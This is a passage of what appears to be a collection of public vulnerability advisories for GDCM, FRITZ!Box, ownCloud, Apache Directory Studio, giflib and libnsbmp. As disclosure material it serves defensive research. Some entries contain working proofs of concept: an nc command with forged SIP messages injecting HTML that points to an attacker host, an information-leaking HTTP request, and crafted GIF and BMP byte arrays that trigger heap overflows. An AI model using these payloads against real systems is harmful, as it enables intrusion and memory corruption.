<https://cwe.mitre.org/data/definitions/426.html>,
<https://cwe.mitre.org/data/definitions/427.html>,
<https://capec.mitre.org/data/definitions/471.html>,
<https://technet.microsoft.com/en-us/library/2269637.aspx>,
<https://msdn.microsoft.com/en-us/library/ff919712.aspx> and
<https://msdn.microsoft.com/en-us/library/ms682586.aspx>
[ï¿½] Another well-known (trivial, easy to avoid, easy to detect,
easy to exploit and easy to fix) and well-documented
vulnerability: see
<https://cwe.mitre.org/data/definitions/377.html>,
<https://cwe.mitre.org/data/definitions/379.html>,
<https://capec.mitre.org/data/definitions/27.html>,
<https://capec.mitre.org/data/definitions/29.html> ..."
3701,CVE-2015-8397: GDCM out-of-bounds read in JPEGLSCodec::DecodeExtent,,CVE-2015-8397,"Grassroots DICOM (GDCM) is a C++ library for processing DICOM medical
images.
It provides routines to view and manipulate a wide range of image formats
and can be accessed through many popular programming languages like Python,
C#, Java and PHP.
GDCM versions 2.6.0 and 2.6.1 (and possibly previous versions) are prone to
an out-of-bounds read vulnerability due to missing checks. The vulnerability
occurs during the decoding of JPEG-LS images when the dimensions of the
embedded JPEG-LS image (as specified in the JPEG headers) are smaller than
the ones of the selected region (set by gdcm::ImageRegionReader::SetRegion
and usually based on DICOM header values).
More information about this vulnerability can be found at
http://census-labs.com/news/2016/01/11/gdcm-out-bounds-read-jpeglscodec-decodeextent/
The GDCM project has released version 2.6.2 that addresses this issue.
It is advised to upgrade all GDCM installations to the latest stable
release.
Disclosure Timeline
-------------------
CVE assignment: December 2nd, 2015
Vendor Contact: December 4th, 2015
Vendor Patch Release: December 23rd, 2015
Public Disclosure: January 11th, 2016
Regards,
Stelios Tsampas
IT Security Researcher
CENSUS S.A."
3702,CVE-2015-8396: GDCM buffer overflow in ImageRegionReader::ReadIntoBuffer,,CVE-2015-8396,"Grassroots DICOM (GDCM) is a C++ library for processing DICOM medical
images.
It provides routines to view and manipulate a wide range of image formats
and can be accessed through many popular programming languages like Python,
C#, Java and PHP.
GDCM versions 2.6.0 and 2.6.1 (and possibly previous versions) are prone
to an
integer overflow vulnerability which leads to a buffer overflow and
potentially to remote code execution. The vulnerability is triggered by the
exposed function gdcm::ImageRegionReader::ReadIntoBuffer, which copies
DICOM
image data to a buffer. ReadIntoBuffer checks whether the supplied
buffer is
large enough to hold the necessary data, however in this check it fails to
detect the occurrence of an integer overflow, which leads to a buffer
overflow
later on in the code. The buffer overflow will occur regardless of the
size of
the buffer supplied to the ReadIntoBuffer call.
More information about this vulnerability can be found at
http://census-labs.com/news/2016/01/11/gdcm-buffer-overflow-imageregionreaderreadintobuffer/
The GDCM project has released version 2.6.2 that addresses this issue.
It is advised to upgrade all GDCM installations to the latest stable
release.
Disclosure Timeline
-------------------
CVE assignment: December 2nd, 2015
Vendor Contact: December 4th, 2015
Vendor Patch Release: December 23rd, 2015
Public Advisory: January 11th, 2016
Regards,
Stelios Tsampas
IT Security Researcher
CENSUS S.A."
3719,[CVE-2015-7242] AVM FRITZ!Box: HTML Injection Vulnerability,,CVE-2015-7242,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Security Advisory
=======================================================================
Title: HTML Injection Vulnerability
Product: AVM FRITZ!OS
Vulnerable Version: All versions prior to 6.30
Fixed Version: 6.30
CVE-ID: CVE-2015-7242
Impact: medium
found: 2015-06-02
by: Dr. Daniel Schliebner <mail ds-develop de>
http://www.ds-develop.de
=======================================================================
Vendor Description:
- -------------------
""AVM offers a wide range of products for high-speed broadband
connectivity and smart home networking. With the FRITZ! product family,
AVM is a leading manufacturer of broadband devices for ADSL, cable, and
LTE as well as Smart Home products for wireless LAN, DECT, and Powerline
in Germany and Europe. The FRITZ!Box is the best known brand for
wireless routers in Germany. In 2014 the communications specialist had
500 employees and generated a turnover of 340 million euros.""
(http://en.avm.de/about-avm/)
Vulnerability Description:
- --------------------------
Current FRITZ!Box router with supported VoIP functionality have open
port 5060 in order to send and receive SIP messages for ip telephony. In
order to get noticed for incoming calls in absence, many such FRITZ!Box
can be set up to send notice e-mails to a user with the callers phone
number and its display-name (if given) inserted into the e-mail.
Due to intrinsic problems with SIP communication, a user agent client
(UAC), however, needs not to perform a VoIP call by using registrars but
can simply initiate an SIP call to another UAC which then has the role
of a user agent server (UAS).
When the UAC sends an INVITE message to the UAS coming with a valid
phone number, it initiates a ringing on the UAS. In this case, the
FRITZ!Box will send a notification e-mail as described above. It uses
the display-name and the phone number specified in the From: header for
the ""who has called"" information in the notification e-mail. However,
these information are not properly escaped so forged display-names will
be inserted invalidated into the e-mail.
This vulnerability can be exploited to perform e.g. CSRF attacks on the
client or similar by embedding <img> or <a> tags into the display-name
with an src attribute pointing to some malicious destination.
However, the good news is that attackers need to be creative here since
the length of the display-name is limited to 20 characters so the
embedded HTML code needs to be very short. Using appropriate, very short
URLs, however, can still be used to exploit this vulnerability in a
serious manner.
Informally, a possible attack would look as follows.
We start by finding a valid user's phone number by trying SIP OPTIONS
messages on the FRITZ!Box until we receive a
SIP/2.0 200 OK
response. We thus obtain the phone number and can send the forged INVITE
SIP message to the FRITZ!Box. As a result, the notification e-mail to
the end user will contain the unescaped sender's FROM display-name and
hence possibly embedded HTML code.
Proof of concept:
- -----------------
Assume a FRITZ!Box with WAN address 80.0.0.0 and an IP phone with number
493012345678 setup.
Step 1:
Initiate TCP connection to FRITZ!Box on port 5060, e.g. using Netcat:
$ nc 80.0.0.0 5060
Step 2:
Send forged SIP INVITE message as follows:
INVITE sip:493012345678 80 0 0 0 SIP/2.0
To: Alice <sip:493012345678 80 0 0 0>;tag=123
From: ""<a href='#'>Bob</a>"" <sip:4930111111111 sip net>;tag=456
Call-ID: abc foo com
CSeq: 123456 INVITE
Via: SIP/2.0/TCP 80.0.0.0;branch=FOO
Content-Length: 0
Exploit:
- --------
In order to exploit the vulnerability, an attacker needs, for instance,
to insert a HTML tag which is short enough for an appropriate URL to be
inserted. An example would be for instance
INVITE sip:493012345678 80 0 0 0 SIP/2.0
To: Alice <sip:493012345678 80 0 0 0>;tag=123
From: ""<img src=http:c.to>"" <sip:4930111111111 sip net>;tag=456
Call-ID: abc foo com
CSeq: 123456 INVITE
Via: SIP/2.0/TCP 80.0.0.0;branch=FOO
Content-Length: 0
The site c.to is here assumed to be either compromised by the attacker,
too, or under its control. In this case the attacker then can, for
instance redirect the user to another URL with malicious code or
using other exploits, e.g. the recent RCE/CSRF vulnerability in
FRITZ!OS, see [2], related to FRITZ!OS prior to 6.30.
Vulnerable / tested versions:
- -----------------------------
Fritz!Box 7390 with FRITZ!OS 6.24
Fritz!Box 7360 SL with FRITZ!OS 6.20
Vendor contact timeline:
- ------------------------
2015-06-02: Contacting vendor through info avm de
2015-06-04: Vendor response - vulnerability will be forwarded
2015-06-04: Vendor response - issue has now the incident-ID CID4191652
2015-06-05: Vulnerability advisory sent to vendor
2015-06-04: Vendor response - issue will be fixed
2015-07-01: Vendor response - Issue is fixed in upcoming Fritz!OS
06.25-30758
2015-07-13: Status update - Fritz!OS 6.30 deployment begin
2015-09-21: Contacted vendor to ask for deployment status of update
2015-09-22: Vendor response - update not currently deployed for all products
2016-01-07: Coordinated release of the security advisory
Solution:
- ---------
Escape HTML entities within the display-name in the From: header or do
not allow other characters than [a-z0-9s] within the display-name.
References
- ----------
[1] https://avm.de/service/sicherheitshinweise/
[2] https://www.redteam-pentesting.de/advisories/rt-sa-2015-001
URL
- ---
http://ds-develop.de/advisories/advisory-2016-01-07-1-avm.txt
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQEcBAEBAgAGBQJWjqgtAAoJEFA4WIKLTb8OS3YH/1WuuyJw5h1JZjBEW78lz23f
4sy2n3XLBlQG5deVSjVYH1j6Sbh//5rcn0vUS12jOndOVJjtkgc8eZuM+Vsh5NXn
qnzagwMZXSeY5mnx6w5UQqzcX4XFv4gTuDzDCfYfqnnwHGHVU6zxuN09hSmGwGBO
psmuZCNTT9eT1BnJRYib7sPXBEBOzu+0AeL/sNuz84kIXeRbWjthaNPYCbdGMo62
QFxxltJvnpx18LVmcpJ6bfFfnDSFWT3GFANjBJSdhvR71QcUaArJ6nDADxT/ZE/A
eyH1IC0h5pbdUzbi2CdaPq2tdzPxHAYJJHjzX/pLkFgJgbAiWpvG5YVaCw7CWGc=
=27k0
-----END PGP SIGNATURE-----"
3724,[SYSS-2015-062] ownCloud Information Exposure Through Directory Listing (CVE-2016-1499),,CVE-2016-1499,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2015-062
Product: ownCloud
Manufacturer: ownCloud Inc., Community
Affected Version(s): ownCloud <= 8.2.1, <= 8.1.4, <= 8.0.9
Tested Version(s): 8.1.1, 8.1.4
Vulnerability Type: Information Exposure Through Directory Listing (CWE-548)
Risk Level: Medium
Solution Status: Fixed
Manufacturer Notification: 2015-07-17
Solution Date: 2015-12-23
Public Disclosure: 2016-01-06
CVE Reference: CVE-2016-1499
Author of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
ownCloud is a software suite for creating and using file hosting
services.
The ownCloud Web site describes the software as follows (see [1]):
""ownCloud is a self-hosted file sync and share server. It provides access
to your data through a web interface, sync clients or WebDAV while
providing a platform to view, sync and share across devices easily � all
under your control. ownCloud�s open architecture is extensible via a
simple but powerful API for applications and plugins and it works with
any storage.""
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
ownCloud is vulnerable to information exposure through directory
listing. It is possible with a normal user to get information about
the complete directory structure and included files of all users.
The 'force' parameter in the script (index.php/apps/files/ajax/scan.php)
can easily be manipulated, by setting its value to 'true'.
This vulnerability can potentially be used for denial-of-service attacks
if the selected directory is deep enough, because to index many
directories requires high computational effort. In addition, sensitive
information from other users is exposed.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
With the following HTTP GET request, it is possible to see the
directories of other users.
GET /index.php/apps/files/ajax/scan.php?force=true&dir=&requesttoken=<VALIDREQUESTTOKEN> HTTP/1.1
Host: [HOST]
Accept: text/event-stream
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: [REFERER]
Cookie: [COOKIES]
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Server response (shortened):
event: user
data: ""[ID]""
event: folder
data: ""/""
event: count
data: 21
event: count
data: 42
event: count
data: 63
event: folder
data: ""/[ID]""
event: folder
data: ""/[ID]/cache""
event: folder
data: ""/[ID]6/files""
event: folder
data: ""/[ID]/files_encryption""
[...]
event: folder
data: ""/[ID]/files_encryption/keys/files/[FILENAME].zip""
event: folder
data: ""/[ID]/files_encryption/keys/files/[FILENAME].zip/OC_DEFAULT_MODULE""
event: folder
data: ""/[ID]/files_encryption/keys/files/[FILENAME].pptx""
[...]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
According to information by ownCloud, the described security issue has
been fixed in software releases:
� ownCloud 8.2.2
� ownCloud 8.1.5
� ownCloud 8.0.10
Please contact the manufacturer for further information or support or
visit https://owncloud.org/security/advisory/?id=oc-sa-2016-002.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2015-11-17: Vulnerability reported to manufacturer
2015-12-23: Patch published by manufacturer
2016-01-06: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] ownCloud, Web Site
https://owncloud.org/
[2] SySS Security Advisory SYSS-2015-062
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-062.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Dr. Erlijn van Genuchten of the
SySS GmbH.
E-Mail: erlijn.vangenuchten syss de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc
Key ID: 0xBD96FF2A
Key Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is"" and
without warranty of any kind. Details of this security advisory may be updated
in order to provide as accurate information as possible. The latest version of
this security advisory is available on the SySS Web site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1
iQIcBAEBCgAGBQJWjiHkAAoJEAylhje9lv8qzJYP/jCxIJ64SWR8lKEvZxEQDSbr
L0XBUOBCtl1K0BQnTVXrSOq5lph8VPfJGdxkC35QWDX9zt1mGJxDqvRuC8ugG5ZU
SqnAimeXWOCeNuZOFWjiynKntxbmqSVfSKws2ZwvR7TYWz8t5n2igflfeIgeHtie
Z5lMPWTAzrU6qcDP1zJBG4hnVIuDorDqsMvuDFY0SSzZgBf+nJ5ovE8P6kvnYs90
eEtZ91oZaGICfGuSaLYu0/GOQ34Ww2v9/9CQyBVukaySJX51d02putfqfnYxZPSx
TrkWPwc9BUGZF0VK+1qwgP0+hr67yz7+ypCQ6KdmHz6chPIlyVk/fAo9X/weuTlA
H2n78Pb1ICHRlsSa8gyVFOJeTTqsmF9AAIWeT5TrcXHlNK2FY46Vl21jxFtNtjeN
wdTfzVGvwJjIDkq6iikg4/yaz3xduCilfJd8vKf1MNki/4Lw1oT+5KGuHJQPAPTD
3nvN+gU4qJxRt2YPaXEvIavpFszkG0GCqZJ5BX7B4b8zW15fl+E5W/ewp95J9FWS
x+s4Vn/7uvrtOpNAcUq0HPLbG5OtgM4DyHceZoQlz1g5fsh8gbrSM7ZKQjKTS3Vb
+MGCAXdwTNwa/cka5WKT16/2959uwTRZO8jQloINfWOwUyweC+JIYPZ2OQsmxLop
ceqeLBdlztCJvqeu5rJY
=tGfZ
-----END PGP SIGNATURE-----"
3729,[SECURITY] CVE-2015-5349: Apache Directory Studio command injection vulnerability,,CVE-2015-5349,"CVE-2015-5349: Apache Directory Studio command injection vulnerability
Severity: Moderate
Vendor: The Apache Software Foundation
Versions Affected:
- Apache LDAP Studio 0.6.0 to 0.8.1
- Apache Directory Studio 1.0.0 to 2.0.0-M9
Description:
The CSV export didn’t escape the fields properly. Malicious users can
put specially crafted values into the LDAP server. When a user exports
that data into CSV formatted file, and subsequently opens it with a
spreadsheet application, the data is interpreted as a formula and executed.
Mitigation:
Users should upgrade to Apache Directory Studio 2.0.0-M10
Credit:
This issue was discovered by ﻿Muhammad Shahmeer Amir."
3750,giflib: heap overflow in giffix (CVE-2015-7555),,CVE-2015-7555,"About
=====
giflib[1] is a library for working with GIF images. It also provides
several command-line utilities.
CVE-2015-7555
=============
A heap overflow may occur in the giffix utility included in giflib-5.1.1
when processing records of the type `IMAGE_DESC_RECORD_TYPE' due to the
allocated size of `LineBuffer' equaling the value of the logical screen
width, `GifFileIn->SWidth', while subsequently having
`GifFileIn->Image.Width' bytes of data written to it.
giflib-5.1.1/util/giffix.c #35..194:
,----
| int main(int argc, char **argv)
| {
| [...]
| if ((LineBuffer = (GifRowType) malloc(GifFileIn->SWidth)) == NULL)
| GIF_EXIT(""Failed to allocate memory required, aborted."");
|
| /* Scan the content of the GIF file and load the image(s) in: */
| do {
| [...]
| switch (RecordType) {
| case IMAGE_DESC_RECORD_TYPE:
| if (DGifGetImageDesc(GifFileIn) == GIF_ERROR)
| QuitGifError(GifFileIn, GifFileOut);
| [...]
| Width = GifFileIn->Image.Width;
| Height = GifFileIn->Image.Height;
| [...]
| /* Find the darkest color in color map to use as a filler. */
| ColorMap = (GifFileIn->Image.ColorMap ? GifFileIn->Image.ColorMap :
| GifFileIn->SColorMap);
| for (i = 0; i < ColorMap->ColorCount; i++) {
| j = ((int) ColorMap->Colors[i].Red) * 30 +
| ((int) ColorMap->Colors[i].Green) * 59 +
| ((int) ColorMap->Colors[i].Blue) * 11;
| if (j < ColorIntens) {
| ColorIntens = j;
| DarkestColor = i;
| }
| }
|
| /* Load the image, and dump it. */
| for (i = 0; i < Height; i++) {
| GifQprintf(""%-4d"", i);
| if (DGifGetLine(GifFileIn, LineBuffer, Width)
| == GIF_ERROR) break;
| if (EGifPutLine(GifFileOut, LineBuffer, Width)
| == GIF_ERROR) QuitGifError(GifFileIn, GifFileOut);
| }
|
| if (i < Height) {
| [...]
| /* Fill in with the darkest color in color map. */
| for (j = 0; j < Width; j++)
| LineBuffer[j] = DarkestColor;
| for (; i < Height; i++)
| if (EGifPutLine(GifFileOut, LineBuffer, Width)
| == GIF_ERROR) QuitGifError(GifFileIn, GifFileOut);
| }
| break;
| [...]
| }
| }
| while (RecordType != TERMINATE_RECORD_TYPE);
| [...]
| }
`----
,----
| $ gdb -q --args ./giffix heap.gif
| Reading symbols from ./giffix...done.
| (gdb) b util/giffix.c:94
| Breakpoint 1 at 0x401131: file giffix.c, line 94.
| (gdb) b util/giffix.c:148
| Breakpoint 2 at 0x401449: file giffix.c, line 148.
| (gdb) b util/giffix.c:149
| Breakpoint 3 at 0x401452: file giffix.c, line 149.
|
| (gdb) commands 3
| Type commands for breakpoint(s) 3, one per line.
| End with a line saying just ""end"".
| >printf ""%p, 0x%02x "", LineBuffer+j, DarkestColor
| >c
| >end
|
| (gdb) r
| [...]
| Breakpoint 1, main (argc=2, argv=0x7fffffffe6b8) at giffix.c:94
| 94 if ((LineBuffer = (GifRowType) malloc(GifFileIn->SWidth)) == NULL)
|
| (gdb) p GifFileIn->SWidth
| $1 = 1
|
| (gdb) c
| [...]
| Breakpoint 2, main (argc=2, argv=0x7fffffffe6b8) at giffix.c:148
| 148 for (j = 0; j < Width; j++)
|
| (gdb) p Width
| $2 = 255
|
| (gdb) c
| Continuing.
|
| Breakpoint 3, main (argc=2, argv=0x7fffffffe6b8) at giffix.c:149
| 149 LineBuffer[j] = DarkestColor;
| 0x618920, 0x01
|
| [...]
|
| Breakpoint 3, main (argc=2, argv=0x7fffffffe6b8) at giffix.c:149
| 149 LineBuffer[j] = DarkestColor;
| 0x618940, 0x01
|
| [...]
|
| Breakpoint 3, main (argc=2, argv=0x7fffffffe6b8) at giffix.c:149
| 149 LineBuffer[j] = DarkestColor;
| 0x618a1e, 0x01
|
| Program received signal SIGSEGV, Segmentation fault.
| 0x00007ffff7bd8658 in GifFreeMapObject (Object=0x101010101010101) at gifalloc.c:80
| 80 (void)free(Object->Colors);
`----
heap.gif:
,----
| unsigned char heap[] = {
| /* GIF87a */
| 0x47, 0x49, 0x46, 0x38, 0x37, 0x61,
|
| /* DGifGetScreenDesc() */
| 0x01, 0x00, /* GifFile->SWidth */
| 0x01, 0x00, /* GifFile->SHeight */
| 0x80, /* ColorCount = 1 << ((this & 0x07) + 1) */
| 0x00, /* GifFile->SBackGroundColor */
| 0x00, /* GifFile->AspectByte */
| 0x11, 0x11, 0x11, /* GifFile->SColorMap->Colors[0] */
| 0x00, 0x00, 0x00, /* GifFile->SColorMap->Colors[1] */
|
| /* DGifGetRecordType() */
| 0x2c, /* DESCRIPTOR_INTRODUCER */
|
| /* DGifGetImageDesc() */
| 0x00, 0x00, /* GifFile->Image.Left */
| 0x00, 0x00, /* GifFile->Image.Top */
| 0xff, 0x00, /* GifFile->Image.Width */
| 0x01, 0x00, /* GifFile->Image.Height */
| 0x00, /* BitsPerPixel = (this & 0x07) + 1 */
|
| /* DGifSetupDecompress() */
| 0x00, /* CodeSize */
|
| /* end of image data */
| 0x00,
|
| /* end of gif */
| 0x3b
| };
`----
Solution
========
No fix exists as of yet.
Footnotes
_________
[1] [http://giflib.sourceforge.net/]
Hans Jerry Illikainen"
3774,libnsbmp: heap overflow (CVE-2015-7508) and out-of-bounds read (CVE-2015-7507),,CVE-2015-7508,"Overview
========
Libnsbmp[1] is a decoding library for BMP and ICO files. It is
primarily developed and used as part of the NetSurf project.
As of version 0.1.2, libnsbmp is vulnerable to a heap overflow
(CVE-2015-7508) and an out-of-bounds read (CVE-2015-7507).
CVE-2015-7508
=============
libnsbmp expects that the user-supplied `bmp_bitmap_cb_create' callback
allocates enough memory to accommodate for `bmp->width * bmp->height *
4' bytes. However, due to the way `pixels_left' is calculated, the last
row of run-length encoded data may expand beyond the end of
`bmp->bitmap', resulting in a heap overflow.
src/libnsbmp.c #951..1097:
,----
| static bmp_result bmp_decode_rle(bmp_image *bmp, uint8_t *data, int bytes, int size) {
| [...]
| swidth = bmp->bitmap_callbacks.bitmap_get_bpp(bmp->bitmap) * bmp->width;
| top = bmp->bitmap_callbacks.bitmap_get_buffer(bmp->bitmap);
| [...]
| do {
| [...]
| length = *data++;
| if (length == 0) {
| [...]
| /* 00 - NN means escape NN pixels */
| if (bmp->reversed) {
| pixels_left = (y + 1) * bmp->width - x;
| scanline = (void *)(top + (y * swidth));
| } else {
| pixels_left = (bmp->height - y + 1) * bmp->width - x;
| scanline = (void *)(bottom - (y * swidth));
| }
| if (length > pixels_left)
| length = pixels_left;
| if (data + length > end)
| return BMP_INSUFFICIENT_DATA;
| [...]
| } else {
| /* NN means perform RLE for NN pixels */
| if (bmp->reversed) {
| pixels_left = (y + 1) * bmp->width - x;
| scanline = (void *)(top + (y * swidth));
| } else {
| pixels_left = (bmp->height - y + 1) * bmp->width - x;
| scanline = (void *)(bottom - (y * swidth));
| }
| if (length > pixels_left)
| length = pixels_left;
| [...]
| pixel2 = *data++;
| pixel = bmp->colour_table[pixel2 >> 4];
| pixel2 = bmp->colour_table[pixel2 & 0xf];
| for (i = 0; i < length; i++) {
| if (x >= bmp->width) {
| x = 0;
| if (++y > bmp->height)
| return BMP_DATA_ERROR;
| scanline -= bmp->width;
| }
| if ((i & 1) == 0)
| scanline[x++] = pixel;
| else
| scanline[x++] = pixel2;
| }
| }
| }
| } while (data < end);
| [...]
| }
`----
Using NetSurf as an example:
,----
| ~/netsurf-all-3.3/netsurf$ gdb -x heap.py --args ./nsgtk heap.bmp
| [...]
| heap overfow: pix: 0xff999999 ptr: 0x7fffe29fefed, end of buf: 0x7fffe29fefec (+1)
| heap overfow: pix: 0xff999999 ptr: 0x7fffe29fefef, end of buf: 0x7fffe29fefec (+3)
| heap overfow: pix: 0xff999999 ptr: 0x7fffe29feff1, end of buf: 0x7fffe29fefec (+5)
|
| Program received signal SIGSEGV, Segmentation fault.
| 0x00000000005183e4 in bmp_decode_rle (bmp=0xda9ff0, data=0xdb9e24 'A' <repeats 23 times>, bytes=157, size=4) at src/libnsbmp.c:1091
| 1091 scanline[x++] = pixel2;
| (gdb)
`----
heap.py:
,----
| class Breakpoint(gdb.Breakpoint):
| def stop(self):
| top = get_hex(""top"")
| width = get_hex(""bmp->width"")
| height = get_hex(""bmp->height"")
| bpp = get_hex(""bmp->bpp"")
| x = get_hex(""x"")
| scanline = get_hex(""scanline"")
| pixel2 = get_hex(""pixel2"")
|
| cur = scanline + x
| end = top + width * height * bpp
| if cur > end:
| print(""heap overfow: pix: 0x%x ptr: 0x%x, end of buf: 0x%x (+%d)"" %
| (pixel2, cur, end, cur - end))
| return False
|
| def get_hex(arg):
| res = gdb.execute(""print/x %s"" % arg, to_string=True)
| x = res.split("" "")[-1].strip()
| return int(x, 16)
|
| Breakpoint(""netsurf-all-3.3/libnsbmp/src/libnsbmp.c:1091"")
|
| gdb.execute(""run"")
`----
heap.bmp:
,----
| unsigned char heap[] = {
| /* bmp_analyse() */
| 0x42, 0x4d, /* BM */
| 0x41, 0x00, 0x00, 0x40, /* bmp size */
| 0x00, 0x00, /* reserved */
| 0x00, 0x00, /* reserved */
| 0x00, 0x00, 0x00, 0x00, /* bmp->bitmap_offset */
|
| /* bmp_analyse_header() */
| 0x6c, 0x00, 0x00, 0x00, /* header_size */
| 0xff, 0x7f, 0x00, 0x00, /* width */
| 0xf7, 0xff, 0xff, 0xff, /* height */
| 0x01, 0x00, /* colour planes */
| 0x04, 0x00, /* bmp->bpp */
| 0x02, 0x00, 0x00, 0x00, /* bmp->encoding */
| 0x04, 0x00, 0x00, 0x00, /* size of bitmap */
| 0x41, 0x41, 0x00, 0x00, /* horizontal resolution */
| 0x41, 0x41, 0x00, 0x00, /* vertical resolution */
| 0x01, 0x00, 0x00, 0x00, /* bmp->colours */
| 0x00, 0x00, 0x00, 0x00, /* number of important colours */
| 0x41, 0x41, 0x41, 0x41, /* mask identifying bits of red component */
| 0x00, 0x00, 0x00, 0x00, /* mask identifying bits of green component */
| 0x00, 0x00, 0x00, 0x00, /* mask identifying bits of blue component */
|
| /*
| * NOTE: the first two bytes of the alpha mask are used in the
| * expansion of the last ""line"".
| *
| * 0xff = the number of bytes to expand,
| * 0x00 = the pixel which, combined with a bitwise AND against 0xf,
| * is used to dereference a (potentially) suiting ""real""
| * pixel in bmp->colour_table. Since bmp->colours is
| * specified as 1, we want this to be 0. No bounds checking
| * is done and as such libnsbmp may be induced to read from
| * bmp->colour_table[out_of_bounds_index] (CVE-2015-7507)
| */
| 0xff, 0x00, 0x41, 0x41, /* mask identifying bits of alpha component */
|
| 0x41, 0x41, 0x41, 0x41, /* color space type */
| 0x41, 0x41, 0x41, 0x41, /* x coordinate of red endpoint */
| 0x41, 0x41, 0x41, 0x41, /* y coordinate of red endpoint */
| 0x41, 0x41, 0x41, 0x41, /* z coordinate of red endpoint */
| 0x41, 0x41, 0x41, 0x41, /* x coordinate of green endpoint */
| 0x41, 0x00, 0x41, 0x41, /* y coordinate of green endpoint */
| 0x41, 0x41, 0x41, 0x41, /* z coordinate of green endpoint */
| 0x41, 0x41, 0x41, 0x41, /* x coordinate of blue endpoint */
| 0x41, 0x41, 0x41, 0x41, /* y coordinate of blue endpoint */
| 0x41, 0x41, 0x41, 0x41, /* z coordinate of blue endpoint */
| 0x41, 0x41, 0x41, 0x41, /* gamma red coordinate scale value */
| 0x41, 0x41, 0x41, 0x41, /* gamma green coordinate scale value */
| 0x41, 0x41, 0x41, 0x41, /* gamma blue coordinate scale value */
|
| /*
| * NOTE: this is what will be expanded on the last ""line""
| */
| 0x99, 0x99, 0x99, /* bmp->colour_table[0] */
|
| 0x41, 0x41, 0x41, 0x41,
| 0x41, 0x41, 0x41, 0x41,
| 0x41, 0x41, 0x41, 0x41,
| 0x41, 0x41, 0x41, 0x41,
| 0x41, 0x41, 0x41, 0x41,
| 0x41, 0x41, 0x41, 0x41,
| 0x41, 0x41, 0x41, 0x41,
| 0x41, 0x41, 0x41, 0x41,
| };
`----
CVE-2015-7507
=============
An out-of-bounds read may occur in libnsbmp due to a lack of boundary
checking before dereferencing `bmp->colour_table' in `bmp_decode_rgb()'
and `bmp_decode_rle()' with an index based on a user-supplied value.
src/libnsbmp.c #306..558:
,----
| static bmp_result bmp_analyse_header(bmp_image *bmp, uint8_t *data) {
| [...]
| header_size = read_uint32(data, 0);
| [...]
| if (header_size == 12) {
| [...]
| bmp->bpp = read_uint16(data, 10);
| /**
| * The bpp value should be in the range 1-32, but the only
| * values considered legal are:
| * RGB ENCODING: 1, 4, 8, 16, 24 and 32
| */
| if ((bmp->bpp != 1) && (bmp->bpp != 4) &&
| (bmp->bpp != 8) &&
| (bmp->bpp != 16) &&
| (bmp->bpp != 24) &&
| (bmp->bpp != 32))
| return BMP_DATA_ERROR;
| bmp->colours = (1 << bmp->bpp);
| palette_size = 3;
| } else if (header_size < 40) {
| return BMP_DATA_ERROR;
| } else {
| [...]
| bmp->colours = read_uint32(data, 32);
| if (bmp->colours == 0)
| bmp->colours = (1 << bmp->bpp);
| palette_size = 4;
| }
| [...]
| if (bmp->bpp < 16) {
| [...]
| /* create the colour table */
| bmp->colour_table = (uint32_t *)malloc(bmp->colours * 4);
| if (!bmp->colour_table)
| return BMP_INSUFFICIENT_MEMORY;
| for (i = 0; i < bmp->colours; i++) {
| bmp->colour_table[i] = data[2] | (data[1] << 8) | (data[0] << 16);
| if (bmp->opaque)
| bmp->colour_table[i] |= (0xff << 24);
| data += palette_size;
| bmp->colour_table[i] = read_uint32((uint8_t *)&bmp->colour_table[i],0);
| }
| }
| [...]
| }
`----
src/libnsbmp.c #951..1097:
,----
| static bmp_result bmp_decode_rle(bmp_image *bmp, uint8_t *data, int bytes, int size) {
| [...]
| do {
| [...]
| length = *data++;
| if (length == 0) {
| [...]
| } else {
| /* 00 - NN means escape NN pixels */
| [...]
| if (size == 8) {
| [...]
| scanline[x++] = bmp->colour_table[(int)*data++];
| }
| } else {
| [...]
| if ((i & 1) == 0) {
| pixel = *data++;
| scanline[x++] = bmp->colour_table
| [pixel >> 4];
| } else {
| scanline[x++] = bmp->colour_table
| [pixel & 0xf];
| }
| }
| [...]
| }
| } else {
| /* NN means perform RLE for NN pixels */
| [...]
| if (size == 8) {
| pixel = bmp->colour_table[(int)*data++];
| [...]
| } else {
| pixel2 = *data++;
| pixel = bmp->colour_table[pixel2 >> 4];
| pixel2 = bmp->colour_table[pixel2 & 0xf];
| [...]
| }
| }
| }
| } while (data < end);
| [...]
| }
`----
